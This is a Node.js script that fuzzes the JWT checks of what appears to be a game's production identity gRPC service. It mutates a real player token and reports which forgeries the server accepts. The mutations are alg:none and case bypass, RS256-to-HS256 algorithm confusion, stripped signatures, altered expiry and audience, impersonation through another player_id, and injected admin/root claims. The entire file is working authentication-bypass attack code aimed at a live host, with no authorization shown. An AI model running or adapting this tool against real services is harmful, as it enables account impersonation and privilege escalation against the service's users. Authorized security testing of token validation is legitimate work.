#!/usr/bin/env node
// JWT validation probe: mutate the player JWT and see which alterations the
// gateway / identity service catches. Hits IdentityService.GetCurrentPlayer
// (read-only, returns the caller's player record + new JWT — so any mutation
// that the server accepts will be obvious from the response).
//
// Env: RSI_JWT   the original valid token (player-scoped)
// Arg: <host:port>

const path = require('path');
const crypto = require('crypto');
const grpc = require('@grpc/grpc-js');
const protoLoader = require('@grpc/proto-loader');

const HOST = process.argv[2] || die('usage: jwt-fuzz.js <host:port>');
const JWT  = process.env.RSI_JWT || die('RSI_JWT env required');
function die(m) { console.error('FATAL:', m); process.exit(1); }

const STATUS = Object.fromEntries(Object.entries(grpc.status).map(([k, v]) => [v, k]));
const b64u = (b) => Buffer.from(b).toString('base64url');
const ub64u = (s) => Buffer.from(s, 'base64url');

function parse(jwt) {
  const [h, p, s] = jwt.split('.');
  return {
    header:    JSON.parse(ub64u(h).toString('utf8')),
    payload:   JSON.parse(ub64u(p).toString('utf8')),
    signature: s,
    raw:       jwt,
  };
}
function compose(header, payload, signature) {
  return `${b64u(JSON.stringify(header))}.${b64u(JSON.stringify(payload))}.${signature || ''}`;
}

const original = parse(JWT);

// Sanity log
console.log(`Original alg=${original.header.alg}  kid=${original.header.kid || '(none)'}`);
console.log(`  exp = ${new Date(original.payload.exp * 1000).toISOString()}  (in ${Math.round((original.payload.exp * 1000 - Date.now()) / 1000)}s)`);
console.log(`  iss = ${original.payload.iss}`);
console.log(`  aud = ${original.payload.aud}`);
console.log(`  player_id = ${original.payload.player_id}`);
console.log();

// Mutation table: (name, function returning the mutated jwt string, description)
const MUTATIONS = [
  ['00-baseline-untouched',         () => JWT,                                                    'control: original valid JWT'],
  ['10-corrupt-signature',          () => {
                                      const sig = ub64u(original.signature);
                                      sig[0] ^= 0xff; sig[sig.length - 1] ^= 0xff;
                                      return compose(original.header, original.payload, b64u(sig));
                                    },                                                            'flip first and last byte of the signature'],
  ['11-empty-signature',            () => compose(original.header, original.payload, ''),         'remove signature entirely'],
  ['12-alg-none',                   () => compose({ ...original.header, alg: 'none' }, original.payload, ''), 'alg:none, no sig'],
  ['13-alg-none-uppercase',         () => compose({ ...original.header, alg: 'None' }, original.payload, ''), 'alg:None (case bypass)'],
  ['14-alg-HS256-with-empty-key',   () => {
                                      const h = { ...original.header, alg: 'HS256' };
                                      delete h.kid;
                                      const signing = `${b64u(JSON.stringify(h))}.${b64u(JSON.stringify(original.payload))}`;
                                      const sig = crypto.createHmac('sha256', '').update(signing).digest();
                                      return `${signing}.${b64u(sig)}`;
                                    },                                                            'algorithm confusion: HS256 keyed with empty string'],
  ['15-alg-HS256-pubkey-as-secret', () => {
                                      // classic RS256→HS256 attack assuming we can guess the pubkey.
                                      // we don't have it; try common stand-ins.
                                      const h = { ...original.header, alg: 'HS256' };
                                      const signing = `${b64u(JSON.stringify(h))}.${b64u(JSON.stringify(original.payload))}`;
                                      const sig = crypto.createHmac('sha256', original.payload.iss).update(signing).digest();
                                      return `${signing}.${b64u(sig)}`;
                                    },                                                            'HS256 keyed with issuer URL (guess)'],
  ['20-exp-in-the-past',            () => compose(original.header, { ...original.payload, exp: 1 },         original.signature), 'exp = epoch+1 (50+ years ago)'],
  ['21-exp-just-expired',           () => compose(original.header, { ...original.payload, exp: Math.floor(Date.now()/1000) - 60 }, original.signature), 'exp = 60s ago'],
  ['22-iat-far-future',             () => compose(original.header, { ...original.payload, iat: Math.floor(Date.now()/1000) + 365*86400 }, original.signature), 'iat one year ahead'],
  ['23-nbf-future',                 () => compose(original.header, { ...original.payload, nbf: Math.floor(Date.now()/1000) + 3600 }, original.signature), 'nbf 1h in the future'],
  ['30-wrong-aud',                  () => compose(original.header, { ...original.payload, aud: 'attacker.example' }, original.signature), 'aud replaced'],
  ['31-wrong-iss',                  () => compose(original.header, { ...original.payload, iss: 'https://attacker.example' }, original.signature), 'iss replaced'],
  ['40-different-player-id',        () => compose(original.header, { ...original.payload, player_id: '999999999999', sub: 'urn:sc:global:player:geid:999999999999' }, original.signature), 'impersonate a nonexistent geid'],
  ['41-add-extra-claim',            () => compose(original.header, { ...original.payload, admin: true, roles: ['root'] }, original.signature), 'inject privilege claims'],
  ['42-remove-player-id',           () => {
                                      const p = { ...original.payload }; delete p.player_id;
                                      return compose(original.header, p, original.signature);
                                    },                                                            'remove player_id claim'],
  ['50-truncated',                  () => JWT.slice(0, JWT.length - 10),                           'last 10 chars chopped'],
  ['51-not-a-jwt',                  () => 'totally not a jwt',                                     'garbage string'],
  ['52-empty',                      () => '',                                                      'empty string'],
  ['53-only-two-segments',          () => `${b64u(JSON.stringify(original.header))}.${b64u(JSON.stringify(original.payload))}`, 'missing signature segment'],
];

// Load identity service once.
const pkgDef = protoLoader.loadSync(
  path.join(__dirname, 'scproto/proto/sc/external/services/identity/v1/api.proto'),
  {
    keepCase: true, longs: String, enums: String, defaults: true, oneofs: true,
    includeDirs: [
      path.join(__dirname, 'scproto/proto'),
      path.join(__dirname, 'scproto/vendor/google/api-common-protos'),
      path.join(__dirname, 'scproto/vendor/grpc-gateway'),
    ],
  });
const Svc = grpc.loadPackageDefinition(pkgDef).sc.external.services.identity.v1.IdentityService;

function probe(jwt) {
  return new Promise((resolve) => {
    const client = new Svc(HOST, grpc.credentials.createSsl(), {});
    const md = new grpc.Metadata();
    if (jwt) md.add('authorization', `Bearer ${jwt}`);
    client.getCurrentPlayer({}, md, { deadline: Date.now() + 6000 }, (err, resp) => {
      client.close();
      if (err) return resolve({ ok: false, code: STATUS[err.code] || err.code, details: (err.details || '').slice(0, 140), meta: err.metadata?.getMap() });
      resolve({ ok: true, geid: resp.player?.geid, name: resp.player?.name, new_jwt_player_id: resp.jwt && JSON.parse(ub64u(resp.jwt.split('.')[1]).toString()).player_id });
    });
  });
}

(async () => {
  for (const [name, mutate, desc] of MUTATIONS) {
    let mutated;
    try { mutated = mutate(); }
    catch (e) { console.log(`  ${name.padEnd(34)}  CONSTRUCT_FAIL  ${e.message.slice(0, 60)}`); continue; }
    const r = await probe(mutated);
    const verdict = r.ok ? `ACCEPTED → geid=${r.geid} name=${r.name}` : `${r.code}  ${r.details}`;
    console.log(`  ${name.padEnd(34)}  ${verdict}`);
    if (r.ok && name !== '00-baseline-untouched') console.log(`    ⚠ ${desc}`);
  }
})();
